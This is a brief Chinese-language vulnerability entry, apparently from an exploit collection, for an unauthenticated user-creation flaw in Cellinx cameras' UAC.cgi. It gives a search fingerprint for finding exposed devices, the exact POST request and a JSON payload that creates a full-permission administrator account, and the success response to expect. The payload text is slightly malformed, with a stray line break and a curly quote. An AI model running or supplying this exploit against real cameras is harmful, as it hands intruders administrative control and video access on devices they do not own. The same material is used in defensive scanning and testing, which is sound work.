# cellinx摄像机uac.cgi存在未授权添加用户漏洞。

cellinx ｜ 未授权访问 ｜ —
- **指纹**：`body="local/NVT-string.js"`
- **请求**：`POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1`

**Payload**
```
{"jsonData": {"username":"guest","password":"","option":"add_user", "data":{"username":"dudesuite","password":"dudesuite","r
permission":{"is_admin":"1","view":"1","ptz":"1","setting":“1","dout":"1"}}}}
```
- **响应特征**：200 Success